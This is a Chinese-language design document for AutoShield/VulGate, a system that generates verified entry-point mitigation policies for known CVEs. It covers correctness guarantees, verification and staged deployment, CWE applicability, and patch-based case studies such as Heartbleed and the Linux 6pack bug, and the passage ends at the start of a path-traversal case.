# AutoShield 正确性保障与 CWE 适用范围

本文整理 AutoShield（仓库目录名 VulGate）的正确性保障设计、生成策略的人工审核边界，以及 CWE 适用范围。

本文描述的是**改进后的设计目标**。除特别说明外，不代表当前原型已经实现全部能力。

---

## 1. 核心结论

AutoShield 无法保证生成的临时补丁在语义上“完全正确”。即使由人编写和审核的正式补丁，也可能引入新的数据流、控制流和资源管理错误。

AutoShield 的正确性主张应限定为：

1. 对通过 Verifier 的 Policy，保证若干局部执行安全性质；
2. 通过独立 Oracle、定向差分测试和生产遥测验证判定正确性；
3. 通过全调用点分析和 fault injection 验证提前返回动作；
4. 对仍然缺少证据的情况输出 `UNKNOWN` 或标记为 out-of-scope；
5. 系统性降低并量化剩余风险，而不是声称消除全部风险。

建议在论文中使用如下表述：

> AutoShield does not guarantee the complete semantic correctness of generated mitigations. Instead, it guarantees execution safety for verified policy bytecode, and systematically evaluates decision and action correctness through independent oracles, directed differential testing, return-use analysis, and staged production observation.

---

## 2. “无副作用”的准确边界

不能将“Policy 不写目标内存”直接等同于“系统行为不受影响”。

Shadow Policy 的求值过程可以是只读的，但 `BLOCK` 会使目标函数提前返回，因此仍会改变控制流和外部可观察行为。

风险至少分为三层：

| 层次 | 含义 | 典型风险 | 保障方式 |
|------|------|----------|----------|
| 执行安全 | Policy/VM 自身安全运行 | 写目标内存、越界读、死循环、危险 Helper、资源失控 | 受限 IR、确定性编译、静态与运行时 Verifier |
| 判定正确 | 对当前调用作出正确的 PASS/BLOCK/UNKNOWN 裁决 | 攻击漏报、正常误拒、状态陈旧、谓词不完整 | 独立 Oracle、DRP 分析、差分测试、定向 fuzz、遥测 |
| 动作正确 | BLOCK 后的提前返回符合程序契约 | 崩溃、错误解引用、重试循环、错误降级、资源异常 | 返回值契约分析、RUP 分析、全调用点检查、fault injection |

即使目标函数一行都没有执行，错误返回仍可能：

- 被调用者当作合法指针或对象使用；
- 触发无限重试或显著放大重试流量；
- 进入更危险的 fallback 或错误恢复路径；
- 破坏调用者已经建立的锁、事务或资源管理假设；
- 被上层错误地翻译为成功、临时失败或不可恢复失败；
- 造成请求失败、服务降级、进程崩溃或拒绝服务。

Talos 对 SQLite CVE-2015-3414 的处理提供了直接反例：静态分析错误地推断目标函数可以返回 `NULL`，但调用者未检查该返回值，最终导致 SQLite 崩溃。因此，返回值合法性不能通过单个错误路径或单个调用点推断，必须检查全部相关调用点和返回值传播路径。

---

## 3. 可信边界与生成管线

### 3.1 LLM 不是可信组件

LLM 只负责生成候选 Policy IR 和辅助测试输入，不能直接生成并签发可信运行时代码，也不能为自己的输出提供最终正确性结论。

每个候选 Policy 应附带一个可审核的证据包：

- 目标函数和拦截入口；
- 漏洞触发谓词；
- 所有读取的参数、字段和只读状态；
- 每个条件对应的补丁 Diff、Sanitizer、Crash Trace 或 PoC 证据；
- `PASS`、`BLOCK`、`UNKNOWN` 的条件；
- 候选 `block_return` 及其来源；
- ABI、整数宽度、符号属性和对象生命周期假设；
- 无法确认的依赖和适用边界。

机制能够限制 LLM 输出的表达能力并保证局部执行安全，但不能仅凭机制保证其语义正确。

### 3.2 建议管线

```text
补丁 Diff / Sanitizer / Crash Trace / PoC / 正常样本
                         │
                         ▼
              LLM 生成候选 Policy IR
              + 条件到证据的映射
                         │
                         ▼
                 确定性 IR 编译器
                         │
                         ▼
             静态 Verifier + 运行时校验
                         │
                         ▼
           DRP/RUP 分析 + 独立 Oracle 测试
                         │
                         ▼
                人工审核与签发策略
                         │
                         ▼
        REPLAY → OBSERVE → CANARY → ENFORCE
```

### 3.3 执行安全的可验证性质

对通过验证的 Policy，可以尝试给出以下局部保证：

- 不写入目标程序地址空间或目标系统状态；
- 只能调用白名单中的只读 Helper；
- 所有内存读取均使用受控安全读取接口；
- 禁止回跳，或证明所有循环具有静态上界；
- 指令数、读取次数、栈空间和执行时间有界；
- 所有退出路径只产生合法的 `PASS/BLOCK/UNKNOWN` 裁决；
- VM 错误不会使宿主程序崩溃；
- Policy 加载失败、VM_ERROR 和 UNKNOWN 的处理策略明确且可审计。

这些性质只能证明 Policy 引擎的局部执行安全，不能推出其漏洞判定和错误返回在业务语义上正确。

---

## 4. 基于 KLAUS 的定向正确性验证

KLAUS 的关键启示是：重新运行原始 PoC 只能证明旧错误不再显现，不能证明补丁没有引入新错误。KLAUS 通过识别补丁改变的读写关系，并使用这些关系指导定向 fuzzing，以更高概率发现反例。

AutoShield 不直接修改目标变量，但会改变漏洞判定和函数返回。因此，可以将 KLAUS 的 Altered Write-Read Pair 迁移为以下两类关系。

### 4.1 Decision–Read Pair（DRP）

DRP 将每个裁决条件与影响该条件的读取配对。

示例：

```text
BLOCK: offset + length > buffer_size
       ├── offset
       ├── length
       ├── buffer_size
       ├── 整数宽度与符号
       └── 加法是否可能溢出
```

DRP 静态检查包括：

- 参考漏洞条件所需的读取是否全部进入 Policy；
- Policy 是否引入无法由证据解释的额外读取；
- signed/unsigned、截断、扩展和溢出语义是否一致；
- 字段偏移、对象类型和生命周期是否正确；
- 条件使用的是同一对象实例，而不是相同类型的其他对象；
- 入口时刻的状态是否足以代表危险操作发生时的状态；
- Observer 提供的状态是否原子、有界且不会陈旧到失去判定意义。

如果参考触发条件 `T` 和 Policy 谓词 `P` 都能转换为受限公式，可以使用 SMT 或穷举边界检查寻找：

```text
T ∧ ¬P    # 参考条件认为会触发漏洞，但 Policy 放行
P ∧ ¬T    # Policy 阻断，但参考条件认为安全
```

该检查只在建模范围内成立，且参考补丁本身不能被当作绝对正确的 Oracle。

### 4.2 Return–Use Pair（RUP）

RUP 将人工注入的 `block_return` 与所有调用者对返回值的使用配对。

```text
block_return
    ├── NULL / ERR_PTR / 整数错误检查
    ├── 直接解引用或字段访问
    ├── 错误码翻译与传播
    ├── retry / fallback 分支
    ├── 锁、事务和资源清理路径
    └── 对外协议状态或用户可见错误
```

RUP 验证包括：

- 枚举所有直接和间接调用点；
- 检查每个调用点是否接受候选返回值；
- 检查返回类型、ABI、错误指针编码和异常约定；
- 沿调用图追踪错误值的传播和翻译；
- 对每个关键调用点注入候选返回值；
- 检查崩溃、错误解引用、锁等待、资源泄漏和请求超时；
- 检查是否出现无限重试或重试放大；
- 检查 fallback 是否仍满足安全要求。

对于 `void`、结构体返回、C++ 异常、Java 异常或语言运行时特殊约定，必须使用类型化 adapter；通用整数/指针阻断桩不能直接复用。

每个案例的 AutoShield 判断必须把“能否判定危险条件”和“能否安全拒绝”分开记录。错误返回值只有同时满足以下条件，才可标为候选合法：

1. 类型、ABI 和语言约定匹配，不能把通用整数错误码注入 `void`、指针、异常或结构体返回接口；
2. 优先复用同一函数、同一调用阶段已有的错误返回或异常路径；若只能借用相邻函数的返回值，必须重新验证；
3. 所有直接和间接调用者都把该值解释为失败，并完成必要的锁、引用、事务和资源处理；
4. 该值不会被误解释为成功、EOF、空对象、缓存未命中或“换一个后端继续”的 fallback 信号；
5. 该值不会触发无界重试、协议重发、任务重新入队或上游流量放大；
6. 对外错误语义与操作阶段一致，例如认证失败、参数错误、资源忙、解析失败不能任意互换；
7. fault injection、超时/重试序列和健康 Oracle 未发现崩溃、泄漏、死锁或可用性放大。

案例中的“候选合法”只表示存在有证据的候选动作，不表示已经通过全调用点 RUP 验证。标为“待验证”的候选不得进入 ENFORCE；无法找到合法动作时，即使危险谓词可判定，也应输出 `UNKNOWN` 或判为 out-of-scope。

### 4.3 定向 fuzzing

测试生成不应只围绕原始 PoC，还应优先覆盖：

- DRP 中尚未覆盖的变量取值和组合；
- 边界值、极值、符号翻转、截断和溢出；
- 到达相同危险点的不同控制流路径；
- 不同对象实例和生命周期状态；
- RUP 中不同调用点和返回值传播路径；
- 重试、fallback、并发和错误恢复序列。

LLM 可以生成候选输入和变体，但测试是否通过必须由独立 Oracle 判断。

---

## 5. 独立 Oracle 与差分测试

### 5.1 Oracle 来源

| Oracle | 信号来源 | 主要用途 |
|--------|----------|----------|
| 攻击 Oracle | 漏洞版到达 sink/sanitizer；修复版不再到达；PoC 及其变体 | 检测攻击漏报 |
| 正常 Oracle | 官方测试、真实正常流量、人工确认请求、held-out 正常集 | 检测正常误拒 |
| 行为 Oracle | 漏洞版与修复版在正常输入上行为一致 | 检测非预期功能差异 |
| 返回值 Oracle | API 文档、既有错误路径、全调用点检查逻辑 | 验证 `block_return` 契约 |
| 健康 Oracle | 崩溃、超时、锁等待、CPU、内存和资源曲线 | 检测稳定性与重试问题 |

生成 Policy 的 LLM 不能作为最终 Oracle。补丁 Diff 也只能作为重要证据之一，因为正式补丁本身仍可能不完整或错误。

### 5.2 差分矩阵

每组测试输入建议至少运行：

```text
漏洞版，无 AutoShield
漏洞版，AutoShield OBSERVE
漏洞版，AutoShield ENFORCE
官方修复版
```

输入集至少包括：

- 原始 PoC；
- PoC 语义保持变体；
- DRP 定向 fuzz 输入；
- 官方正常测试；
- held-out 正常样本；
- 边界与畸形输入；
- 状态序列和并发输入；
- RUP 错误返回注入输入。

### 5.3 判定标准

| 输入类型 | 期望结果 |
|----------|----------|
| 已确认攻击 | AutoShield 应 BLOCK；不得到达漏洞 sink |
| 已确认正常 | AutoShield 应 PASS；行为应与基线或修复版等价 |
| 证据不足 | 应显式产生 UNKNOWN，不得伪装成已确认 PASS/BLOCK |
| 返回值注入 | 调用者应进入合法错误路径，不崩溃、不无限重试 |

---

## 6. OBSERVE、Canary 与生产遥测

Pilot Execution 的可迁移思想是：在提交真实动作之前，以隔离或不改变生产状态的方式预览结果。

AutoShield 建议使用：

```text
OFFLINE → REPLAY → OBSERVE → CANARY ENFORCE → ENFORCE
```

### 6.1 OBSERVE 语义

OBSERVE 与 ENFORCE 执行完全相同的 Policy 字节码，但只记录：

- `would_block`；
- `PASS/UNKNOWN/VM_ERROR`；
- 命中的 Policy 条件；
- 请求或调用标识；
- 经隐私处理的输入特征；
- Policy 版本、目标函数和执行开销。

OBSERVE 不实际提前返回，因此：

- 可以估计新 Policy 的裁决分布；
- 可以将 `would_block` 与已知攻击/正常标签关联；
- 不能单独证明 `block_return` 的真实后果安全；
- 不能把 `would_block rate` 直接当作正常误拒率；
- 在未修补系统上运行时不能提供真实保护。

更安全的升级方式是“旧策略继续 enforce，新策略同时 shadow”，而不是为了观察新策略而全局放行。

### 6.2 指标定义

```text
would-block 率 = would_block / 全部调用

正常误拒率 = (benign 且 would_block) / 全部 benign

攻击漏报率 = (attack 且 pass) / 全部 attack

重试放大率 = BLOCK 后产生的重试调用数 / 基线重试调用数

返回契约违规率 = 产生崩溃、错误解引用或非法状态的注入次数
                 / 全部返回值注入次数
```

还应报告：

- 调用级误拒和请求级失败；
- UNKNOWN/VM_ERROR 率；
- 行为等价率；
- major-feature retention；
- 崩溃、超时和锁等待；
- CPU、内存与吞吐开销；
- canary 与基线的错误码、重试和 fallback 差异。

阈值应由业务 SLO 和漏洞风险共同决定，不能使用统一固定值。若观察到 `n` 个独立正常样本且零误拒，可使用约 `3/n` 作为误拒率的 95% 置信上界。

### 6.3 自动降级原则

检测到异常后，应优先：

1. 从新策略回退到已经验证的旧策略；
2. 回退到更粗粒度但已知安全的 SWRR/整函数阻断；
3. 隔离受影响流量或实例；
4. 最后才根据威胁与可用性权衡考虑 fail-open。

不能把“Policy 异常后默认放行”描述为普遍安全策略，因为目标系统可能仍处于可利用状态。

---

## 7. 人工审核成本与相关工作比较

AutoShield 的目标不是取消人工审核，而是将审核对象压缩为受限 Policy、证据映射和返回值契约。

不应直接声称“VulShield/PET 无法人工 Review”。更准确的假设是：

- PET 的端到端审核面可能包含入口 checkpoint、危险点前 prevention、出口 restoration，以及需要恢复的成对状态操作；
- VulShield 的审核面可能包含 sanitizer 到 use-def/data-flow 分析、变量在函数内的变化、检测点选择，以及源级表达式到二进制地址和寄存器的映射；
- AutoShield 在漏洞可由简单入口谓词判定时，审核对象可以压缩为受限谓词、只读依赖、证据映射和类型化提前返回动作；复杂 Shadow 语义切片还必须额外审核循环上界、typed adapter 和跨过程调用摘要；
- 如果目标函数入口无法直接判定，可以尝试在同一调用链的子函数入口重放只读前缀，并把该子函数作为经过验证的安全失败边界；系统仍不在任意函数中部跳转。无法满足该条件时应输出 `UNKNOWN/out-of-scope`。

可使用 VulShield 论文中的 CVE-2021-42008 作为共同案例：VulShield 需要分析索引变量在函数内的 use-def 链和多次增量，再选择适当检测点；AutoShield 只有在这些变化能从入口状态可靠归约成一个入口谓词时才接受该案例，否则应判为不适用。

### 7.1 审核包

建议每个 Policy 的人工审核包包含：

- 简洁、可读的 Policy IR；
- 每个 IR 条件到补丁/Sanitizer/Trace 的映射；
- DRP 列表及未解析依赖；
- RUP 全调用点摘要；
- 攻击、正常和返回值测试结果；
- OBSERVE 遥测摘要；
- 已知限制、UNKNOWN 条件和部署回退方案。

### 7.2 人力成本实验

不能先验断言 AutoShield 比正式修复或其他系统更容易审核，应通过实验测量：

- 审核耗时；
- 需要阅读的函数数和代码行数；
- Policy 条件数和状态依赖数；
- 插桩点数量；
- 清理、恢复和返回值传播路径数量；
- 审核者发现错误 Policy 的准确率；
- 审核者之间的一致性；
- 审核 AutoShield 与编写、审核正式补丁的耗时差异。

合理的论文主张是：

> 对触发条件可在入口判定的漏洞实例，受限入口 Policy 有望比修改完整程序逻辑提供更小的审核面；该优势需要由审核时间和审核准确率实验验证。

---

## 8. CWE 适用判据

AutoShield 不按 CWE 编号直接宣称覆盖全部漏洞实例。一个具体漏洞实例只有同时满足以下条件才适用：

1. 漏洞触发谓词可以在目标函数入口，由参数、只读状态或受控 Observer 私有状态判定；
2. 所需读取能够通过安全、稳定且有界的接口完成；
3. 入口状态与危险操作发生时的状态之间不存在无法观察的关键变化；
4. 阻断后存在经过验证的错误返回或异常路径；
5. Policy 能在受限 IR 中表达并通过 Verifier；
6. 存在独立攻击、正常和返回值 Oracle；
7. 剩余误拒、漏报和动作风险符合部署 SLO。

建议在 Design 中固定声明：

> VulGate does not claim to repair every instance of a CWE class. It targets vulnerability instances whose triggering predicate is decidable from function-entry inputs and read-only state, and whose early-return action satisfies a verified caller contract. Cases needing post-entry side effects, unobservable interleavings, or complex cross-component semantics are `UNKNOWN` or out of scope.

---

## 9. CWE 适用范围表

本表将两个问题分开：

- **设计适用性**：具备完整 Observer、类型化 adapter、独立 Oracle 和调用点 RUP 后，入口 Policy 对该类漏洞实例是否有合理的临时缓解路径；
- **当前 VulGate 原型**：只按当前代码判断——单目标入口拦截、最多读取函数参数/寄存器、`safe_read_u8`、无 Observer/权威 Oracle，通用阻断动作只支持整数/指针 ABI，规则生成器目前主要生成 `arg_gt`。这里的“窄域可执行”不等于现有 `gen_rule.py` 已经能自动生成，也不等于覆盖整个 CWE 类别。

| CWE | 弱点形式 | 入口临时缓解模式 | 设计适用性 | 当前 VulGate 原型 | 当前判断的必要条件/主要缺口 | CVE 案例 |
|-----|----------|------------------|------------|-------------------|----------------------------|----------|
| CWE-787 | 越界写 | 比较长度、索引和边界后拒绝 | 强适用（具体实例） | 窄域可执行 | 仅限最终边界值是入口标量、目标返回为整数/指针；CVE-2021-42008 的 `void` 入口当前不能直接拦截 | CVE-2021-42008 |
| CWE-125 | 越界读 | 比较实际长度与偏移组合后拒绝 | 强适用（具体实例） | 窄域可执行 | 需要最终长度在入口参数可见；复杂协议解析和 `void`/异常动作仍需 adapter | CVE-2014-0160 |
| CWE-119 | 缓冲区边界不当 | 归入具体越界读/写谓词 | 仅作范围概括 | 不作为独立目标 | 必须落到 CWE-787/125 和具体边界；不能用上位类重复计数 | CVE-2016-10270 |
| CWE-190/191 | 整数溢出/下溢 | 在危险算术或转换结果被使用前拒绝 | 强适用（类型语义明确时） | 当前不支持通用实例 | 当前上下文以无符号标量为主，规则生成器没有 signed/width/转换模型；需类型化算术 IR | CVE-2013-2028 |
| CWE-476 | 空指针解引用 | 入口直接指针/参数为空时拒绝 | 强适用（直接输入 NULL） | 窄域可执行 | 仅限 NULL 是入口参数；内部竞态/生命周期产生的 NULL 不适用；返回 ABI 必须匹配 | CVE-2007-3642 |
| CWE-20 | 输入验证不当 | 对具体字段做范围/枚举/长度检查 | 具体子谓词适用 | 窄域可执行 | 可表达标量比较；任意格式、结构和字符串验证不属于当前生成器能力 | CVE-2007-3642 |
| CWE-22 | 路径穿越 | 规范化路径与允许根比较 | 条件适用 | 当前不支持 | 缺少完整字符串遍历、规范化和文件对象一致性；不能只搜 `../` | 正：CVE-2018-14355；反：CVE-2018-15664 |
| CWE-770 | 未限额资源分配 | 按显式输入上限/配额拒绝 | 条件适用 | 仅显式标量上限可窄域执行 | 无并发安全配额和累计资源 Observer；CVE-2018-16645 的完整分配语义需额外规则/返回 adapter | 正：CVE-2018-16645；反：CVE-2019-9511 |
| CWE-416 | Use-After-Free | 根据生命周期/所有权状态拒绝 | 条件适用 | 当前不支持 | 无对象生命周期 Observer、对象身份和多入口状态；禁止探测疑似悬空指针 | 正：CVE-2022-2588；反：CVE-2021-0920 |
| CWE-415 | Double Free | 根据所有权/生命周期令牌拒绝 | 条件适用 | 当前不支持 | 无原子所有权状态和类型化释放路径；通用错误码不能替代清理 | 正：CVE-2017-2636；反：CVE-2021-3492 |
| CWE-362 | 竞态 | 检测已知冲突状态并拒绝第二操作 | 条件适用 | 当前不支持 | 只能单入口、无 in-flight Observer、无退出清除/原子状态，不能覆盖 CVE-2017-2636 workaround | 正：CVE-2017-2636；反：CVE-2016-5195 |
| CWE-367 | TOCTOU | 在最终使用点附近检查稳定对象和边界 | 弱/条件 | 当前不支持该 CVE 形态 | 设计上可用私有 parser cursor 在子函数入口重放只读解析前缀；当前仍缺少 typed adapter、安全失败边界和调用者契约验证 | 边界：CVE-2020-25212；反：CVE-2018-15664 |
| CWE-78/77 | 命令/参数注入 | 完整命令和参数白名单/语法约束 | 条件适用 | 当前不支持 | 缺少字符串解析、编码和 shell/delegate 语义；黑名单不够 | 正：CVE-2014-6271；反：CVE-2016-3714 |
| CWE-89 | SQL 注入 | 在 sink 前验证参数化或危险拼接 | 条件适用 | 当前不支持通用 SQL 实例 | 当前只有字节级读取，不能建模完整 SQL；但若第一请求明确暴露 `sort_order`，可另行做 `ASC/DESC` 标量白名单 | 正：CVE-2013-7262；边界：CVE-2020-35700 |
| CWE-94/502 | 代码注入/反序列化 | 动态执行/反序列化入口白名单 | 条件适用 | 当前不支持 | 无 Java 对象图、类解析、JNDI 或 gadget 语义；需语言/运行时 adapter | 正：CVE-2021-44228；反：CVE-2015-4852 |
| CWE-862/863/639 | 缺失/错误授权、IDOR | 比较主体、资源、操作和权威授权状态 | 条件适用 | 当前不支持 | 无权威 ACL Oracle、跨组件状态和执行时重核验；仅比较用户传入 ID 不够 | 正：CVE-2023-35164；边界：CVE-2021-22253 |
| CWE-306 | 关键功能缺少认证 | 敏感入口检查认证上下文 | 条件适用 | 当前不支持通用 Web/API 实例 | 缺少 HTTP/框架认证上下文和 401/403 typed adapter；单个布尔参数不足以证明认证链 | 正：CVE-2023-26035；反：CVE-2021-26855 |
| CWE-352 | CSRF | 验证 token、Origin 和 session 绑定 | 条件适用 | 当前不支持 | 无请求级 session/OAuth/Origin 状态和框架异常 adapter；非幂等请求还需重放验证 | 正：CVE-2021-43846；反：CVE-2022-0154 |
| CWE-79 | XSS | 在明确输出 sink 阻断错误上下文数据 | 弱/条件 | 当前不支持 | 缺少 HTML/DOM/Vue 上下文；字符串比较不能替代输出编码语义，`htmlPrefilter` 还需要字符串契约 | 正：CVE-2020-11022；反：CVE-2021-21383 |
| CWE-200 | 敏感信息暴露 | 在导出/访问入口按数据标签和主体拒绝 | 弱/条件 | 窄域可执行数值边界实例 | 类似 ioctl 数值上界可用标量规则；数据分类、授权和 Meltdown 等硬件侧信道不支持 | 正：CVE-2018-16658；反：CVE-2017-5754 |
| CWE-400 | 资源耗尽总类 | 不直接作为统一目标 | 不建议 | 当前不支持 | 必须具体化为配额、速率、队列或协议谓词，并选择不会重试放大的动作 | CVE-2023-44487 |
| CWE-835 | 无限循环 | 仅在危险参数可由入口充分约束时拒绝 | 弱适用 | 当前不支持该 parser 形态 | 当前无法观察内部进展、EOF 或循环状态；CVE-2022-0778 也需要复杂参数语义 | 正：CVE-2022-0778；边界：CVE-2018-1999012 |
| CWE-401/772 | 内存/资源泄漏 | 不直接处理；需内部清理 | 不适用 | 当前不支持 | 单入口提前返回不能执行跨路径释放、取消提交或生命周期修复 | CVE-2019-19073 |

当前表的结论是：VulGate 原型真正能做的是“入口可见的少量标量谓词 + 已验证整数/指针返回”的窄域实验；其余条目是设计目标、需要新增 adapter/Observer，或应保持 `UNKNOWN`，不能把表中的设计适用性误读为当前覆盖率。

这一口径对应当前实现中的 `shadow_ctx` 参数/寄存器模型和三个受限 Helper（[autoshield.h](../../runtime/autoshield.h:31)），单目标 kprobe 与整数/指针通用阻断桩（[module.c](../../runtime/kernel/module.c:14)），以及目前主要生成 `arg_gt` 规则的生成器（[gen_rule.py](../../tools/rulegen/gen_rule.py:23)）。

---

## 10. CVE 补丁实例与适用性证据

本节中的 CVE 及补丁来源已于 **2026-07-23** 联网核对。真实性至少通过 CVE Program 记录确认；在能够获得公开源码时，同时核对上游提交、补丁或项目安全公告。

这里的“适用正例”表示：存在一个合理的函数入口，使漏洞触发条件能够由入口参数、只读状态或受控 Observer 私有状态判定，并且能够选择合法的提前返回动作。它不表示当前原型已经自动生成了该 Policy。

每个 `AutoShield 判断` 后单列“错误返回值合法性”。其中“候选合法”仍须通过全调用点 RUP 和 fault injection；“待验证”表示目前没有足够证据选择返回动作，不能部署为 ENFORCE；“不适用”表示返回值选择无法弥补判定条件或修复动作本身超出入口 Policy 能力。

“不适用反例”表示：真实修复依赖函数执行过程中的状态变化、原子化、序列化、跨组件语义或复杂对象图；对这种实例不能仅凭 CWE 编号声称 AutoShield 可用。反例并不表示该漏洞没有其他临时缓解方案。

下面的代码均为根据真实补丁压缩得到的语义示意，不替代上游补丁原文。

### 10.1 CWE-787：越界写

**适用示例：CVE-2021-42008，Linux 6pack `decode_data()` 越界写。**

**漏洞原理：** 6pack 驱动把收到的字节逐步解码到固定大小的 `sp->cooked_buf`。`sp->rx_count_cooked` 表示当前已经写入的位置，而本次解码路径还会连续写入两个字节。旧代码没有在写入前验证“当前位置 + 本次增量”是否仍小于数组大小；攻击者持续输入数据即可使索引越过末尾并写坏相邻 slab 内存。

**真实补丁：** 在函数使用 `sp->cooked_buf` 前加入：

```c
if (sp->rx_count_cooked + 2 >= sizeof(sp->cooked_buf))
    return;
```

**AutoShield 判断：** VulShield 对该案例给出的入口约束也是 `sp->rx_count_cooked + 2 >= 400`。所需 counter、固定增量和数组边界均可在 `decode_data()` 入口读取，因此适合作为 AutoShield 的首批实验；实际阻断桩仍需验证该 `void` 函数的类型化返回动作。

**错误返回值合法性：** 候选动作是与上游补丁相同的 `void` 提前返回，而不是默认 `-13`。该动作在写入任何 cooked buffer 字节前执行时不伪造数值错误码；但仍须验证调用链不会把“本次字节被静默丢弃”当作可继续的完整帧，也不会反复向该入口重送同一数据。通过这些 RUP/序列测试前仅为候选合法。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2021-42008)、[Linux 补丁 19d1532](https://github.com/torvalds/linux/commit/19d1532a187669ce86d5a2696eb7275310070793)。

### 10.2 CWE-125：越界读

**适用示例：CVE-2014-0160，OpenSSL Heartbleed。**

**漏洞原理：** TLS heartbeat 消息同时包含“网络记录实际长度”和由对端填写的“payload 声明长度”。旧代码信任声明长度，直接从记录缓冲区复制相应字节，却没有确认记录中确实存在这么多 payload 和 padding。攻击者发送很短的记录并声明很大的 payload，OpenSSL 就会越过记录边界，把进程堆内存作为 heartbeat 响应返回。

**真实补丁：** 在复制 heartbeat payload 前检查记录实际长度：

```c
if (1 + 2 + 16 > record_length)
    return 0;
if (1 + 2 + payload + 16 > record_length)
    return 0;
```

**AutoShield 判断：** payload 声明长度、记录实际长度和固定协议开销在 heartbeat 处理入口均可获得，可以直接生成入口拒绝谓词。需要使用防溢出的等价写法，例如 `payload > record_length - fixed_overhead`。

**错误返回值合法性：** 候选值是补丁在同一 heartbeat 处理函数中使用的 `0`。它在该 API 中表示丢弃本次非法 heartbeat，而不是一般意义上的成功；必须沿不同 TLS/DTLS 调用点确认 `0` 不会被翻译成“已发送响应”、触发对同一记录的重复处理或进入不安全 fallback。完成该检查前不能仅凭“补丁返回 0”认定全局合法。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2014-0160)、[OpenSSL 补丁 96db902](https://github.com/openssl/openssl/commit/96db9023b881d7cd9f379b0c154650d6c108e9a3)。

### 10.3 CWE-119：缓冲区边界不当

**适用示例：CVE-2016-10270，LibTIFF strip 数量计算导致越界读取。**

**漏洞原理：** TIFF 图像用 strip offsets 和 byte counts 数组描述各图像条带。旧代码根据文件中已有数据字节数推算 strip 数；当文件数据不足以覆盖声明的图像高度时，推算结果与后续按图像行读取所需的 strip 数不一致，读取函数最终会索引到 offsets/byte-counts 数组之外。

**真实补丁：** 不再根据可能不足的压缩数据总字节数推算 strip 数，而是根据图像高度和 `rowsperstrip` 计算实际 strip 数：

```c
nstrips = how_many(image_length, rows_per_strip);
if (nstrips == 0)
    return;
```

**AutoShield 判断：** 图像元数据已经解析并作为目标函数入口状态存在时，Policy 可以检查 strip 数与 offsets/byte-counts 数组边界。该案例应在实验中具体标注为 CWE-125，而不是只报告上位类 CWE-119。

**错误返回值合法性：** 示例补丁使用 `void` 提前返回，因此只能在具有相同签名、且尚未发布部分图像状态的入口复用。需要验证上层不会继续消费未初始化或旧的 strip 数组，也不会把静默返回当作成功解码；若调用方需要显式失败标记而当前 hook 无法设置，该入口的动作即不合法，应改选能够返回解码错误的更外层入口。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2016-10270)、[LibTIFF 补丁 9a72a69](https://github.com/vadz/libtiff/commit/9a72a69e035ee70ff5c41541c8c61cd97990d018)。

### 10.4 CWE-190/191：整数溢出或下溢

**适用示例：CVE-2013-2028，Nginx chunked parser 整数符号错误。**

**漏洞原理：** Nginx 解析 HTTP chunk size 时把攻击者控制的十六进制长度累积到有符号整数中。超大的 chunk size 会发生符号溢出，使内部 `size` 或 `length` 变成负数。后续代码把该错误长度用于缓冲区和指针计算，最终可能触发栈缓冲区越界和代码执行。

**真实补丁：** 在使用 chunk size 和剩余长度前拒绝负值：

```c
if (ctx->size < 0 || ctx->length < 0)
    goto invalid;
```

**AutoShield 判断：** 解析后的 chunk size 和长度状态在相关 parser 入口可读，临时 Policy 可以使用同一谓词提前返回解析错误。必须保留真实类型宽度和有符号语义，否则 Policy 自身可能重复原溢出错误。

**错误返回值合法性：** 不能从 `goto invalid` 简化为任意负数。候选动作必须等价于该 parser 既有 `invalid` 路径最终返回的解析错误，并保留其错误状态设置；随后要验证 HTTP 请求层会终止畸形请求，而不是把它当作“数据不足”继续等待或重试。若 hook 无法复现该错误状态与返回码组合，则错误动作待验证，不能 ENFORCE。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2013-2028)、[Nginx 官方补丁](http://nginx.org/download/patch.2013.chunked.txt)。

### 10.5 CWE-476：空指针解引用

**适用示例：CVE-2007-3642，Linux H.323 ASN.1 decoder 越界 choice 导致 NULL 解引用。**

**漏洞原理：** H.323 ASN.1 `CHOICE` 数据中包含一个决定后续字段类型的索引。旧 decoder 没有先确认该索引落在 schema 的 choice 表范围内，也没有完整确认目标字段可被 decode。恶意编码可以让 decoder 选择不存在的表项，得到空的 `base` 或无效描述符，并在继续解码时解引用 NULL。

**真实补丁：** 补充 choice index 和 decode 属性检查：

```c
if (type >= field->choice_count)
    return H323_ERROR_RANGE;
if (!base || !(field->attr & DECODE))
    return H323_ERROR_RANGE;
```

**AutoShield 判断：** choice index、字段表边界和指针值在 decoder 入口可读，且补丁已有合法错误返回值，因此是入口拒绝的直接正例。若 NULL 是函数内部竞态产生，而不是由入口输入决定，则不能套用本例结论。

**错误返回值合法性：** `H323_ERROR_RANGE` 是同一 decoder 对越界 choice 使用的领域错误码，因而是强候选；仍需确认所有调用者都将它作为终止当前 ASN.1 对象解析的失败，而不会继续使用部分构造对象、把它折叠为成功或反复重解码同一输入。通过全调用点注入后方可称为合法。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2007-3642)、[Linux 补丁 25845b5](https://github.com/torvalds/linux/commit/25845b5155b55cd77e42655ec24161ba3feffa47)。

### 10.6 CWE-20：输入验证不当

**适用示例：CVE-2007-3642 的 choice index 范围验证。**

**漏洞原理：** 攻击者控制的 ASN.1 choice index 没有经过范围和字段属性验证，就被用来选择 decoder 表项。“输入验证不当”在这里不是抽象标签，而是缺少两个明确检查：索引必须小于 choice 数量，目标字段必须允许 decode。

**真实补丁与临时 Policy：** 该补丁把宽泛的 CWE-20 落实为具体谓词 `type < choice_count`：

```text
入口读取：type、choice_count、field attributes
BLOCK：type 越界，或字段不允许 decode
动作：返回现有 H323_ERROR_RANGE
```

**AutoShield 判断：** CWE-20 的实验必须像本例一样给出具体字段、谓词和错误动作，不能把任意格式验证都归为已支持。

**错误返回值合法性：** 本例候选值同样是既有 `H323_ERROR_RANGE`，其合法性证据只覆盖 H.323 choice 范围错误，不能推广为 CWE-20 的通用返回值。每个新的输入验证案例都必须重新确定领域错误码，并检查调用者不会把“非法输入”误当作 EOF、可重试的短读或默认值回退。

来源：[CVE 记录](https://cveawg.mitre.org/api/cve/CVE-2007-3642)、[Linux 补丁 25845b5](https://github.com/torvalds/linux/commit/25845b5155b55cd77e42655ec24161ba3feffa47)。

### 10.7 CWE-22：路径穿越

**适用正例：CVE-2018-14355，Mutt/NeoMutt IMAP mailbox `..` 穿越。**

